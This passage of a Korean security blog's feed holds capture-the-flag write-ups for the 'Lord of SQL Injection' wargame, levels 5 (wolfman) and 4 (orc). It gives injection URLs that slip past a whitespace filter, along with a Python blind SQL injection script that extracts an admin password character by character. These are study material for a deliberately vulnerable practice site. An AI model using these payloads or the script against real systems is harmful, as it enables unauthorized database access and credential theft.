때문이다.</p><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>Tab</p><p>ASCII Code 표를 살펴보면 16진수로 <code>0x09</code>는 <code>Tab</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%09or%09id=&apos;admin&apos;--%09-</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span><span class="keyword">or</span><span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">---'</span></span><br></pre></td></tr></table></figure><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>주석</p><p>MySQL에서 구문 사이에 주석을 넣으면 공백이 없어도 정상적으로 동작한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;/**/or/**/id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>주석으로 <code>#</code>을 쓴 이유는 <code>-- -</code>을 사용할 때 가운데 공백으로 주석을 사용하면 정상적으로 작동하지 않기 때문이다.</p><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.4 Orc</title>
    <link href="https://www.jslee.me/2019/08/15/los-write-up-04-orc/"/>
    <id>https://www.jslee.me/2019/08/15/los-write-up-04-orc/</id>
    <published>2019-08-15T02:23:17.000Z</published>
    <updated>2019-08-20T11:08:10.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 4번 orc 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>기본적인 Blind SQL Injection을 할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string addslashes ( string $str )</span><br></pre></td></tr></table></figure><ul><li><code>addslashes</code> 함수는 데이터베이스 질의 등에서 처리할 필요가 있는 문자(홑따옴표(‘), 겹따옴표(“), 백슬래시(\), NUL(NULL 바이트)) 앞에 백슬래시를 붙인 문자열을 반환한다.</li><li>php의 <code>addslashes</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.addslashes.php" target="_blank" rel="noopener">PHP: addslashes - Manual</a></li></ul><h4 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h4><p>4번 orc 문제같은 경우 실제 <code>pw</code>값을 알아내야 한다. 이때 화면에 <code>Hello admin</code>이라는 문자열이 출력되었는지 안 되었는지 여부에 따라 조작한 SQL문의 조건절이 참인지 거짓인지 알아낼 수 있다.</p><p>이처럼 SQL Injection이 가능하고 조작한 SQL문의 조건절이 참인지 거짓인지를 구분할 수 있는 경우 원하는 데이터를 하나씩 알아낼 수 있는데, 이를 Blind SQL Injection 이라고 한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>orc 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>;</span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 pw를 받고, pw에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>;</span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello admin&quot;</code> 이라는 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>SUBSTR</code> 함수 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=&apos; or id=&apos;admin&apos; and length(pw)=8-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_orc <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">length</span>(pw)=<span class="number">8</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p>이는 <code>&quot;Hello admin&quot;</code>을 출력하게 만든다. 즉, <code>pw</code>는 8자리임을 알아낸 것이다.</p><p>이와 비슷한 방법으로 쿼리를 조작하면 <code>pw</code> 역시 전부 알아낼 수 있다.</p><p>하지만 이를 반복하여 8자리를 모두 알아내는 것은 사람이 하기 버거우므로 python 코드를 작성하여 풀면 편하다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request <span class="comment"># python3의 내장 라이브러리인 urllib의 request 모듈을 사용할 수 있도록 이 코드에 불러온다.</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="comment"># python3의 내장 라이브러리인 urllib의 parse 모듈에 들어있는 quote 함수를 사용할 수 있도록 이 코드에 불러온다.</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span> <span class="comment"># pw값을 저장할 문자열 변수</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>): <span class="comment"># 8자리임을 알아냈으므로 i에는 1부터 8까지 들어가도록 반복문을 구성</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>): <span class="comment"># ASCII Code에서 화면에 출력 가능한 문자의 10진수 범위는 32부터 126까지이다.</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="</span> <span class="comment"># 공격할 URL에서 변하지 않는 부분이다.</span></span><br><span class="line">        data = <span class="string">"' or id='admin' and substr(pw, 1, &#123;&#125;)='&#123;&#125;'#"</span>.format(</span><br><span class="line">            str(i), key + chr(j)) <span class="comment"># 반복문을 진행하며 계속 다른 문자가 들어갈 문자열이다.</span></span><br><span class="line">        print(data) <span class="comment"># 반복문이 한 번 돌 때마다 URL을 출력하도록 한다.</span></span><br><span class="line">        data = quote(data) <span class="comment"># URL Encoding을 해 준다.</span></span><br><span class="line">        re = urllib.request.Request(url + data) <span class="comment"># 1행에서 불러온 request 모듈의 Request 클래스를 통해 Request 객체를 만든다.</span></span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>) <span class="comment"># re 객체의 header에 User-agent를 추가한다. User-agent가 없으면 403 Forbidden 오류가 난다.</span></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"</span></span><br><span class="line">        ) <span class="comment"># re 객체의 header에 Cookie로 본인이 로그인한 클라이언트의 PHPSESSID를 추가한다. 이것이 없으면 페이지가 login_chk()에 걸려 그 다음 처리를 하지 않고 &lt;script&gt;location.href='./';&lt;/script&gt; 만 응답한다.</span></span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re) <span class="comment"># 객체를 이용해 요청을 보낸다.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>: <span class="comment"># 응답에서 "Hello admin"이라는 문자열을 찾은 경우. find()는 찾으면 시작 인덱스를, 못 찾으면 -1을 반환하는 함수이다.</span></span><br><span class="line">            key += chr(j).lower() <span class="comment"># key 변수 뒤에 ASCII Code로 j값에 해당하는 문자를 붙인다.</span></span><br><span class="line">            print(key) <span class="comment"># key를 출력한다.</span></span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># i번째 위치의 문자를 찾았으므로 반복문을 탈출한다.</span></span><br><span class="line">print(key) <span class="comment"># 반복문이 끝나면 최종적으로 찾아낸 8글자 key를 출력한다.</span></span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>295d5844</code> 를 출력한다.<br>이를 GET방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 4번 orc 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
</feed>
